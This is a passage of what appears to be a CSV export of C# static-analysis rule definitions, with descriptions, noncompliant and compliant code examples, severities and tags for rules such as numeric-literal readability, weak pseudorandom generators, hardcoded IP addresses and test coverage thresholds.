2018-10-25T10:33:52+0200,"<p>Beginning with C# 7, it is possible to add underscores ('_') to numeric literals to enhance readability. The addition of underscores in this manner
has no semantic meaning, but makes it easier for maintainers to understand the code.</p>
<p>The number of digits to the left of a decimal point needed to trigger this rule varies by base.</p>
<table>
  <tbody>
    <tr>
      <th>Base</th>
      <th> Minimum digits</th>
    </tr>
    <tr>
      <td>binary</td>
      <td> 9 </td>
    </tr>
    <tr>
      <td>decimal</td>
      <td> 6 </td>
    </tr>
    <tr>
      <td>hexadecimal</td>
      <td> 9 </td>
    </tr>
  </tbody>
</table>
<p>It is only the presence of underscores, not their spacing that is scrutinized by this rule.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>C# version</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i = 10000000;  // Noncompliant; is this 10 million or 100 million?
int  j = 0b01101001010011011110010101011110;  // Noncompliant
long l = 0x7fffffffffffffffL;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int i = 10_000_000;
int  j = 0b01101001_01001101_11100101_01011110;
long l = 0x7fff_ffff_ffff_ffffL;
</pre>",csharpsquid:S2148,cs,C#,"<p>Beginning with C# 7, it is possible to add underscores ('_') to numeric literals to enhance readability. The addition of underscores in this manner
has no semantic meaning, but makes it easier for maintainers to understand the code.</p>
<p>The number of digits to the left of a decimal point needed to trigger this rule varies by base.</p>
<table>
  <tbody>
    <tr>
      <th>Base</th>
      <th> Minimum digits</th>
    </tr>
    <tr>
      <td>binary</td>
      <td> 9 </td>
    </tr>
    <tr>
      <td>decimal</td>
      <td> 6 </td>
    </tr>
    <tr>
      <td>hexadecimal</td>
      <td> 9 </td>
    </tr>
  </tbody>
</table>
<p>It is only the presence of underscores, not their spacing that is scrutinized by this rule.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>C# version</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i = 10000000;  // Noncompliant; is this 10 million or 100 million?
int  j = 0b01101001010011011110010101011110;  // Noncompliant
long l = 0x7fffffffffffffffL;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int i = 10_000_000;
int  j = 0b01101001_01001101_11100101_01011110;
long l = 0x7fff_ffff_ffff_ffffL;
</pre>",Underscores should be used to make large numbers readable,[],MINOR,['convention'],CODE_SMELL
2018-05-16T12:56:55+0200,"<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386"">CVE-2013-6386</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419"">CVE-2006-3419</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102"">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>System.Random</code> class relies on a pseudorandom number generator, it should not be used for security-critical applications or for
protecting sensitive data. In such context, the <code>System.Cryptography.RandomNumberGenerator</code> class which relies on a cryptographically
strong random number generator (RNG) should be used in place.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Only use random number generators which are <a
  href=""https://www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet#Rule_-_Use_strong_random_numbers"">recommended by OWASP</a> or any other
  trusted organization. </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
var random = new Random(); // Questionable use of Random
byte[] data = new byte[16];
random.NextBytes(data);
return BitConverter.ToString(data); // Check if this value is used for hashing or encryption
</pre>
<h2>Compliant Solution</h2>
<pre>
using System.Security.Cryptography;
...
var randomGenerator = RandomNumberGenerator.Create(); // Compliant for security-sensitive use cases
byte[] data = new byte[16];
randomGenerator.GetBytes(data);
return BitConverter.ToString(data);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/338.html"">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator
  (PRNG) </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/330.html"">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/310"">MITRE, CWE-310</a> - Cryptographic Issues </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/mAFqAQ"">CERT, MSC02-J.</a> - Generate strong random numbers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qw4"">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom
  numbers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/WYIyAQ"">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom
  numbers </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> Derived from FindSecBugs rule <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM"">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>",csharpsquid:S2245,cs,C#,"<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386"">CVE-2013-6386</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419"">CVE-2006-3419</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102"">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>System.Random</code> class relies on a pseudorandom number generator, it should not be used for security-critical applications or for
protecting sensitive data. In such context, the <code>System.Cryptography.RandomNumberGenerator</code> class which relies on a cryptographically
strong random number generator (RNG) should be used in place.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Only use random number generators which are <a
  href=""https://www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet#Rule_-_Use_strong_random_numbers"">recommended by OWASP</a> or any other
  trusted organization. </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
var random = new Random(); // Questionable use of Random
byte[] data = new byte[16];
random.NextBytes(data);
return BitConverter.ToString(data); // Check if this value is used for hashing or encryption
</pre>
<h2>Compliant Solution</h2>
<pre>
using System.Security.Cryptography;
...
var randomGenerator = RandomNumberGenerator.Create(); // Compliant for security-sensitive use cases
byte[] data = new byte[16];
randomGenerator.GetBytes(data);
return BitConverter.ToString(data);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/338.html"">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator
  (PRNG) </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/330.html"">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/310"">MITRE, CWE-310</a> - Cryptographic Issues </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/mAFqAQ"">CERT, MSC02-J.</a> - Generate strong random numbers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qw4"">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom
  numbers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/WYIyAQ"">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom
  numbers </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> Derived from FindSecBugs rule <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM"">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>",Using pseudorandom number generators (PRNGs) is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a3']",SECURITY_HOTSPOT
2015-12-08T17:00:00+0100,"<p>The overloading mechanism should be used in place of optional parameters for several reasons:</p>
<ul>
  <li> Optional parameter values are baked into the method call site code, thus, if a default value has been changed, all referencing assemblies need
  to be rebuilt, otherwise the original values will be used. </li>
  <li> The Common Language Specification (CLS) allows compilers to ignore default parameter values, and thus require the caller to explicitly specify
  the values. For example, if you want to consume a method with default argument from another .NET compatible language (for instance C++/CLI), you
  will have to provide all arguments. When using method overloads, you could achieve similar behavior as default arguments. </li>
  <li> Optional parameters prevent muddying the definition of the function contract. Here is a simple example: if there are two optional parameters,
  when one is defined, is the second one still optional or mandatory? </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void Notify(string company, string office = ""QJZ"") // Noncompliant
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void Notify(string company)
{
  Notify(company, ""QJZ"");
}
void Notify(string company, string office)
{
}
</pre>
<h2>Exceptions</h2>
<p>The rule ignores non externally visible methods.</p>",csharpsquid:S2360,cs,C#,"<p>The overloading mechanism should be used in place of optional parameters for several reasons:</p>
<ul>
  <li> Optional parameter values are baked into the method call site code, thus, if a default value has been changed, all referencing assemblies need
  to be rebuilt, otherwise the original values will be used. </li>
  <li> The Common Language Specification (CLS) allows compilers to ignore default parameter values, and thus require the caller to explicitly specify
  the values. For example, if you want to consume a method with default argument from another .NET compatible language (for instance C++/CLI), you
  will have to provide all arguments. When using method overloads, you could achieve similar behavior as default arguments. </li>
  <li> Optional parameters prevent muddying the definition of the function contract. Here is a simple example: if there are two optional parameters,
  when one is defined, is the second one still optional or mandatory? </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void Notify(string company, string office = ""QJZ"") // Noncompliant
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void Notify(string company)
{
  Notify(company, ""QJZ"");
}
void Notify(string company, string office)
{
}
</pre>
<h2>Exceptions</h2>
<p>The rule ignores non externally visible methods.</p>",Optional parameters should not be used,[],CRITICAL,['pitfall'],CODE_SMELL
2017-09-08T12:35:24+0200,"<p>There's no point in having a test class without any test methods.This could lead a maintainer to assume a class is covered by tests even though it
is not.</p>
<p>Supported test frameworks are <code>NUnit</code> and <code>MSTest</code> (not applicable to <code>xUnit</code>).</p>
<p>This rule will raise an issue when any of these conditions are met:</p>
<ul>
  <li> For <strong>NUnit</strong>, a class is marked with <code>TestFixture</code> but does not contain any method marked with <code>Test</code>,
  <code>TestCase</code>, <code>TestCaseSource</code> or <code>Theory</code>. </li>
  <li> For <strong>MSTest</strong>, a class is marked with <code>TestClass</code> but does not contain any method marked with <code>TestMethod</code>
  or <code>DataTestMethod</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
[TestFixture]
public class SomeClassTest { } // Noncompliant - no test

[TestClass]
public class SomeOtherClassTest { } // Noncompliant - no test
</pre>
<h2>Compliant Solution</h2>
<pre>
[TestFixture]
public class SomeClassTest
{
    [Test]
    public void SomeMethodShouldReturnTrue() { }
}

[TestClass]
public class SomeOtherClassTest
{
    [TestMethod]
    public void SomeMethodShouldReturnTrue() { }
}
</pre>
<h2>Exceptions</h2>
<ul>
  <li> abstract classes </li>
  <li> derived classes that inherit from a base class that does have test methods </li>
  <li> in <strong>MSTest</strong>, classes that contain methods marked with either <code>AssemblyInitialize</code> or <code>AssemblyCleanup</code>.
  </li>
</ul>",csharpsquid:S2187,cs,C#,"<p>There's no point in having a test class without any test methods.This could lead a maintainer to assume a class is covered by tests even though it
is not.</p>
<p>Supported test frameworks are <code>NUnit</code> and <code>MSTest</code> (not applicable to <code>xUnit</code>).</p>
<p>This rule will raise an issue when any of these conditions are met:</p>
<ul>
  <li> For <strong>NUnit</strong>, a class is marked with <code>TestFixture</code> but does not contain any method marked with <code>Test</code>,
  <code>TestCase</code>, <code>TestCaseSource</code> or <code>Theory</code>. </li>
  <li> For <strong>MSTest</strong>, a class is marked with <code>TestClass</code> but does not contain any method marked with <code>TestMethod</code>
  or <code>DataTestMethod</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
[TestFixture]
public class SomeClassTest { } // Noncompliant - no test

[TestClass]
public class SomeOtherClassTest { } // Noncompliant - no test
</pre>
<h2>Compliant Solution</h2>
<pre>
[TestFixture]
public class SomeClassTest
{
    [Test]
    public void SomeMethodShouldReturnTrue() { }
}

[TestClass]
public class SomeOtherClassTest
{
    [TestMethod]
    public void SomeMethodShouldReturnTrue() { }
}
</pre>
<h2>Exceptions</h2>
<ul>
  <li> abstract classes </li>
  <li> derived classes that inherit from a base class that does have test methods </li>
  <li> in <strong>MSTest</strong>, classes that contain methods marked with either <code>AssemblyInitialize</code> or <code>AssemblyCleanup</code>.
  </li>
</ul>",TestCases should contain tests,[],BLOCKER,"['confusing', 'tests', 'unused']",CODE_SMELL
2018-10-25T10:33:52+0200,"<p>When logging a message there are several important requirements which must be fulfilled:</p>
<ul>
  <li> The user must be able to easily retrieve the logs </li>
  <li> The format of all logged message must be uniform to allow the user to easily read the log </li>
  <li> Logged data must actually be recorded </li>
  <li> Sensitive data must only be logged securely </li>
</ul>
<p>If a program directly writes to the standard outputs, there is absolutely no way to comply with those requirements. That's why defining and using a
dedicated logger is highly recommended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private void DoSomething()
{
    // ...
    Console.WriteLine(""so far, so good...""); // Noncompliant
    // ...
}
</pre>
<h2>Exceptions</h2>
<p>The following are ignored by this rule:</p>
<ul>
  <li> Console Applications </li>
  <li> Calls in methods decorated with <code>[Conditional (""DEBUG"")]</code> </li>
  <li> Calls included in DEBUG preprocessor branches (<code>#if DEBUG</code>) </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/RoElAQ"">CERT, ERR02-J.</a> - Prevent exceptions while logging data </li>
</ul>",csharpsquid:S106,cs,C#,"<p>When logging a message there are several important requirements which must be fulfilled:</p>
<ul>
  <li> The user must be able to easily retrieve the logs </li>
  <li> The format of all logged message must be uniform to allow the user to easily read the log </li>
  <li> Logged data must actually be recorded </li>
  <li> Sensitive data must only be logged securely </li>
</ul>
<p>If a program directly writes to the standard outputs, there is absolutely no way to comply with those requirements. That's why defining and using a
dedicated logger is highly recommended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private void DoSomething()
{
    // ...
    Console.WriteLine(""so far, so good...""); // Noncompliant
    // ...
}
</pre>
<h2>Exceptions</h2>
<p>The following are ignored by this rule:</p>
<ul>
  <li> Console Applications </li>
  <li> Calls in methods decorated with <code>[Conditional (""DEBUG"")]</code> </li>
  <li> Calls included in DEBUG preprocessor branches (<code>#if DEBUG</code>) </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/RoElAQ"">CERT, ERR02-J.</a> - Prevent exceptions while logging data </li>
</ul>",Standard outputs should not be used directly to log anything,[],MAJOR,"['bad-practice', 'cert']",CODE_SMELL
2016-05-25T15:32:27+0200,"<p>Marking a method with the <code>Pure</code> attribute specifies that the method doesn't make any visible changes; thus, the method should return a
result, otherwise the call to the method should be equal to no-operation. So <code>Pure</code> on a <code>void</code> method is either a mistake, or
the method doesn't do any meaningful task.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Person
{
  private int age;
  [Pure] // Noncompliant. In this case the method makes a possibly visible state change
  void ConfigureAge(int age)
  {
    ...
    this.age = age;
  }
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Person
{
  private int age;

  void ConfigureAge(int age)
  {
    ...
    this.age = age;
  }
  ...
}
</pre>",csharpsquid:S3603,cs,C#,"<p>Marking a method with the <code>Pure</code> attribute specifies that the method doesn't make any visible changes; thus, the method should return a
result, otherwise the call to the method should be equal to no-operation. So <code>Pure</code> on a <code>void</code> method is either a mistake, or
the method doesn't do any meaningful task.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Person
{
  private int age;
  [Pure] // Noncompliant. In this case the method makes a possibly visible state change
  void ConfigureAge(int age)
  {
    ...
    this.age = age;
  }
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Person
{
  private int age;

  void ConfigureAge(int age)
  {
    ...
    this.age = age;
  }
  ...
}
</pre>","Methods with ""Pure"" attribute should return a value",[],MAJOR,[],BUG
2018-10-25T10:33:52+0200,"<p>The use of punctuation characters to separate subgroups in a number can make the number more readable. For instance consider 1,000,000,000 versus
1000000000. But when the grouping is irregular, such as 1,000,00,000; it indicates an error. </p>
<p>This rule raises an issue when underscores (<code>_</code>) are used to break a number into irregular subgroups.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int duos = 1_00_00;
int million = 1_000_00_000;  // Noncompliant
int thousand = 1000;
int tenThousand = 100_00;  // Noncompliant
</pre>",csharpsquid:S3937,cs,C#,"<p>The use of punctuation characters to separate subgroups in a number can make the number more readable. For instance consider 1,000,000,000 versus
1000000000. But when the grouping is irregular, such as 1,000,00,000; it indicates an error. </p>
<p>This rule raises an issue when underscores (<code>_</code>) are used to break a number into irregular subgroups.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int duos = 1_00_00;
int million = 1_000_00_000;  // Noncompliant
int thousand = 1000;
int tenThousand = 100_00;  // Noncompliant
</pre>",Number patterns should be regular,[],CRITICAL,['suspicious'],CODE_SMELL
2015-07-27T14:14:22+0200,"<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901"">CVE-2006-5901</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725"">CVE-2005-3725</a> </li>
</ul>
<p>Today's services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It forces the same address to be used in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service at this address or spoof the IP address. Such an attack is always
possible, but in the case of a hardcoded IP address the fix will be much slower, which will increase an attack's impact.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> make the IP address configurable. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
var ip = ""192.168.12.42"";
var address = IPAddress.Parse(ip);
</pre>
<h2>Compliant Solution</h2>
<pre>
var ip = ConfigurationManager.AppSettings[""myapplication.ip""];
var address = IPAddress.Parse(ip);
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Although ""::"" is a valid IPv6 address, the rule doesn't report on it. </li>
  <li> No issue is reported for 127.0.0.1 because loopback is not considered as sensitive </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",csharpsquid:S1313,cs,C#,"<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901"">CVE-2006-5901</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725"">CVE-2005-3725</a> </li>
</ul>
<p>Today's services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It forces the same address to be used in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service at this address or spoof the IP address. Such an attack is always
possible, but in the case of a hardcoded IP address the fix will be much slower, which will increase an attack's impact.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> make the IP address configurable. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
var ip = ""192.168.12.42"";
var address = IPAddress.Parse(ip);
</pre>
<h2>Compliant Solution</h2>
<pre>
var ip = ConfigurationManager.AppSettings[""myapplication.ip""];
var address = IPAddress.Parse(ip);
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Although ""::"" is a valid IPv6 address, the rule doesn't report on it. </li>
  <li> No issue is reported for 127.0.0.1 because loopback is not considered as sensitive </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",Using hardcoded IP addresses is security-sensitive,[],MAJOR,['cert'],SECURITY_HOTSPOT
2017-11-14T07:57:43+0100,"<p>When creating a custom Markup Extension that accepts parameters in WPF, the <code>ConstructorArgument</code> markup must be used to identify the
discrete properties that match these parameters. However since this is done via a string, the compiler will not notice if there are typos.</p>
<p>This rule raises an issue when the string argument to <code>ConstructorArgumentAttribute</code> doesn't match any parameter of any constructor.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace myLibrary
{
  public class MyExtension : MarkupExtension
  {
    public MyExtension() { }

    public MyExtension(object value1)
    {
      Value1 = value1;
    }

    [ConstructorArgument(""value2"")]
    public object Value1 { get; set; }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace myLibrary
{
  public class MyExtension : MarkupExtension
  {
    public MyExtension() { }

    public MyExtension(object value1)
    {
      Value1 = value1;
    }

    [ConstructorArgument(""value1"")]
    public object Value1 { get; set; }
  }
}
</pre>",csharpsquid:S4260,cs,C#,"<p>When creating a custom Markup Extension that accepts parameters in WPF, the <code>ConstructorArgument</code> markup must be used to identify the
discrete properties that match these parameters. However since this is done via a string, the compiler will not notice if there are typos.</p>
<p>This rule raises an issue when the string argument to <code>ConstructorArgumentAttribute</code> doesn't match any parameter of any constructor.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace myLibrary
{
  public class MyExtension : MarkupExtension
  {
    public MyExtension() { }

    public MyExtension(object value1)
    {
      Value1 = value1;
    }

    [ConstructorArgument(""value2"")]
    public object Value1 { get; set; }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace myLibrary
{
  public class MyExtension : MarkupExtension
  {
    public MyExtension() { }

    public MyExtension(object value1)
    {
      Value1 = value1;
    }

    [ConstructorArgument(""value1"")]
    public object Value1 { get; set; }
  }
}
</pre>","""ConstructorArgument"" parameters should exist in constructors",[],MAJOR,"['wpf', 'xaml']",BUG
2013-06-19T07:34:52+0200,An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.,common-cs:InsufficientBranchCoverage,cs,C#,An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.,Branches should have sufficient coverage by tests,"[{'key': 'minimumBranchCoverageRatio', 'defaultValue': '65', 'type': 'FLOAT'}]",MAJOR,['bad-practice'],CODE_SMELL
2013-06-19T07:34:52+0200,An issue is created on a file as soon as there is at least one block of duplicated code on this file,common-cs:DuplicatedBlocks,cs,C#,An issue is created on a file as soon as there is at least one block of duplicated code on this file,Source files should not have any duplicated blocks,[],MAJOR,['pitfall'],CODE_SMELL
2015-10-13T10:34:23+0200,Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.,common-cs:FailedUnitTests,cs,C#,Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.,Failed unit tests should be fixed,[],MAJOR,[],BUG
2013-06-19T07:34:52+0200,An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.,common-cs:InsufficientCommentDensity,cs,C#,An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.,Source files should have a sufficient density of comment lines,"[{'key': 'minimumCommentDensity', 'defaultValue': '25', 'type': 'FLOAT'}]",MAJOR,['convention'],CODE_SMELL
2013-06-19T07:34:52+0200,An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.,common-cs:InsufficientLineCoverage,cs,C#,An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.,Lines should have sufficient coverage by tests,"[{'key': 'minimumLineCoverageRatio', 'defaultValue': '65', 'type': 'FLOAT'}]",MAJOR,['bad-practice'],CODE_SMELL
2015-10-13T10:34:23+0200,Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.,common-cs:SkippedUnitTests,cs,C#,Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.,Skipped unit tests should be either removed or fixed,[],MAJOR,['pitfall'],CODE_SMELL
2016-03-04T14:35:13+0100,"<p>Default arguments are determined by the static type of the object. If a default argument is different for a parameter in an overriding method, the
value used in the call will be different when calls are made via the base or derived object, which may be contrary to developer expectations. </p>
<p>Default parameter values are useless in explicit interface implementations, because the static type of the object will always be the implemented
interface. Thus, specifying default values is useless and confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Base
{
  public virtual void Write(int i = 42)
  {
    Console.WriteLine(i);
  }
}

public class Derived : Base
{
  public override void Write(int i = 5) // Noncompliant
  {
    Console.WriteLine(i);
  }
}

public class Program
{
  public static void Main()
  {
    var derived = new Derived();
    derived.Write(); // writes 5
    Print(derived);  // writes 42; was that expected?
  }
  private void Print(Base item)
  {
    item.Write();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Base
{
  public virtual void Write(int i = 42)
  {
    Console.WriteLine(i);
  }
}

public class Derived : Base
{
  public override void Write(int i = 42)
  {
    Console.WriteLine(i);
  }
}

public class Program
{
  public static void Main()
  {
    var derived = new Derived();
    derived.Write(); // writes 42
    Print(derived);  // writes 42
  }
  private void Print(Base item)
  {
    item.Write();
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 8-3-1 - Parameters in a overriding virtual function shall either use the same default arguments as the function they override,
  or else shall not specify any default arguments. </li>
</ul>",csharpsquid:S1006,cs,C#,"<p>Default arguments are determined by the static type of the object. If a default argument is different for a parameter in an overriding method, the
value used in the call will be different when calls are made via the base or derived object, which may be contrary to developer expectations. </p>
<p>Default parameter values are useless in explicit interface implementations, because the static type of the object will always be the implemented
interface. Thus, specifying default values is useless and confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Base
{
  public virtual void Write(int i = 42)
  {
    Console.WriteLine(i);
  }
}

public class Derived : Base
{
  public override void Write(int i = 5) // Noncompliant
  {
    Console.WriteLine(i);
  }
}

public class Program
{
  public static void Main()
  {
    var derived = new Derived();
    derived.Write(); // writes 5
    Print(derived);  // writes 42; was that expected?
  }
  private void Print(Base item)
  {
    item.Write();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Base
{
  public virtual void Write(int i = 42)
  {
    Console.WriteLine(i);
  }
}

public class Derived : Base
{
  public override void Write(int i = 42)
  {
    Console.WriteLine(i);
  }
}

public class Program
{
  public static void Main()
  {
    var derived = new Derived();
    derived.Write(); // writes 42
    Print(derived);  // writes 42
  }
  private void Print(Base item)
  {
    item.Write();
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 8-3-1 - Parameters in a overriding virtual function shall either use the same default arguments as the function they override,
  or else shall not specify any default arguments. </li>
</ul>",Method overrides should not change parameter defaults,[],CRITICAL,"['misra', 'pitfall']",CODE_SMELL
2015-05-20T05:01:17+0200,<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>,csharpsquid:S103,cs,C#,<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>,Lines should not be too long,"[{'key': 'maximumLineLength', 'htmlDesc': 'The maximum authorized line length.', 'defaultValue': '200', 'type': 'INTEGER'}]",MAJOR,['convention'],CODE_SMELL
2015-05-20T05:01:17+0200,"<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
